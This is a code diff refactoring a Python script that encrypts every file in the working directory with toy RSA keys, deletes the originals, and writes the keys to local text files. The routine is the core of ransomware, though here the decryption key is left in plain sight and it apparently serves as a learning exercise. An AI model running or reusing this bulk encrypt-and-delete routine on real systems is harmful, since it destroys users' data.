@@ -1,12 +1,13 @@
 import os
 import encrypto
 
-prime1 = encrypto.generateLargePrime(32)
-prime2 = encrypto.generateLargePrime(32)
+ENCRYPTION_BIT = 32
+prime1 = encrypto.generate_prime(ENCRYPTION_BIT)
+prime2 = encrypto.generate_prime(ENCRYPTION_BIT)
 
-e = encrypto.generate_encryption_key(prime1, prime2)
-d = encrypto.generate_decryption_key(e, prime1, prime2)
-p = prime1 * prime2
+ENCRYPTION_KEY = encrypto.generate_encryption_key(prime1, prime2)
+DECRYPTION_KEY = encrypto.generate_decryption_key(ENCRYPTION_KEY, prime1, prime2)
+PUBLIC_KEY = prime1 * prime2
 
 for file in os.listdir():
     if not (file.endswith('.py') or file.endswith('.encrypted')
@@ -20,22 +21,20 @@ for file in os.listdir():
                 fr.close()
             print('Encrypting file ' + file)
             with open(file + '.encrypted', 'w') as fw:
-                fw.write(encrypto.encryptByte(file_bytes, e, p))
+                fw.write(encrypto.encrypt(file_bytes, ENCRYPTION_KEY, PUBLIC_KEY))
                 fw.close()
             os.remove(file)
         except PermissionError:
             print('Cannot open ' + file)
-        except:
-            print('Unknown Error')
 
 with open('rsa_final_encryption_key.txt', 'w') as fw:
-    fw.write(str(e))
+    fw.write(str(ENCRYPTION_KEY))
     fw.close()
 with open('rsa_final_decryption_key.txt', 'w') as fw:
-    fw.write(str(d))
+    fw.write(str(DECRYPTION_KEY))
     fw.close()
 with open('rsa_public_encryption_key.txt', 'w') as fw:
-    fw.write(str(p))
+    fw.write(str(PUBLIC_KEY))
     fw.close()
 
 print('END')
